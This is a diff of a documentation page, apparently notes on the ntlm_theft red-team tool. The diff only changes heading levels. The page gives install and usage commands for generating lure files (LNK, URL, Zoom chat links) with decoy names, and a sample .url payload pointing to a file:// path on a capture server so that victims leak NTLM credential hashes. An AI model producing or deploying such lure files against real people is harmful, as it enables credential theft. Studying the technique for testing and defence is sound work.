@@ -44,20 +44,20 @@ The benefits of these file types over say macro based documents or exploit docum
 * Click Link in Chat Program
   * .txt – formatted link to paste into Zoom chat
 
-### Installation
+## Installation
 
 ```plain
 git clone https://github.com/Greenwolf/ntlm_theft.git
 python3 -m pip install xlsxwriter
 ```
 
-### Usage
+## Usage
 
 ```plain
 ntlm_theft.py --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>
 ```
 
-### Flags
+## Flags
 
 ```plain
 ntlm_theft by Jacob Wilkin(Greenwolf)
@@ -82,7 +82,7 @@ Required parameters.
 -f, --filename  : The base filename without extension, can be renamed later (eg: test, Board-Meeting2020, Bonus_Payment_Q4)
 ```
 
-### Examples
+## Examples
 
 #### Create LNK file(s)
 
@@ -105,6 +105,6 @@ $ cat generated-url/generated-url-\(url\).url
 URL=file://10.10.10.10/leak/leak.html
 ```
 
-### URL list
+## URL List
 
 * [Github.com - ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
